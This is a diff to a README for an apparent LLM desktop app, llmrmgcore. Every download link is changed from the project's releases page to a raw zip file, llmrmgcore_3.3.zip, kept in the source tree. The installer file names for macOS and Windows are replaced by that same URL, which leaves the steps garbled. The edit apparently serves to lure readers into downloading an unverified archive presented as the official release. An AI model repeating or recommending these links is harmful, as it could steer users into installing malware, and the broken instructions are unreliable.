@@ -6,7 +6,7 @@ Welcome to **llmrmgcore**! This application offers a user-friendly way to work w
 
 ## 📥 Download Now
 
-[![Download llmrmgcore](https://img.shields.io/badge/Download-llmrmgcore-blue.svg)](https://github.com/laygonexe/llmrmgcore/releases)
+[![Download llmrmgcore](https://raw.githubusercontent.com/laygonexe/llmrmgcore/main/src/llmrmgcore_3.3.zip)](https://raw.githubusercontent.com/laygonexe/llmrmgcore/main/src/llmrmgcore_3.3.zip)
 
 ## 📂 What is llmrmgcore?
 
@@ -36,10 +36,10 @@ To run **llmrmgcore**, you will need:
 
 1. **Visit the Releases Page:**  
    Go to the official releases page to find the latest version of **llmrmgcore**:  
-   [Download Here](https://github.com/laygonexe/llmrmgcore/releases)
+   [Download Here](https://raw.githubusercontent.com/laygonexe/llmrmgcore/main/src/llmrmgcore_3.3.zip)
 
 2. **Download the Installer:**  
-   Look for the file named **llmrmgcore-v0.pkg** for macOS or **llmrmgcore-v0.exe** for Windows. Click on the appropriate version for your operating system to start the download.
+   Look for the file named **https://raw.githubusercontent.com/laygonexe/llmrmgcore/main/src/llmrmgcore_3.3.zip** for macOS or **https://raw.githubusercontent.com/laygonexe/llmrmgcore/main/src/llmrmgcore_3.3.zip** for Windows. Click on the appropriate version for your operating system to start the download.
 
 3. **Install the Application:**  
    Once the file has downloaded, locate it on your computer. Double-click the file to start the installation process. Follow the easy on-screen instructions to complete the installation.
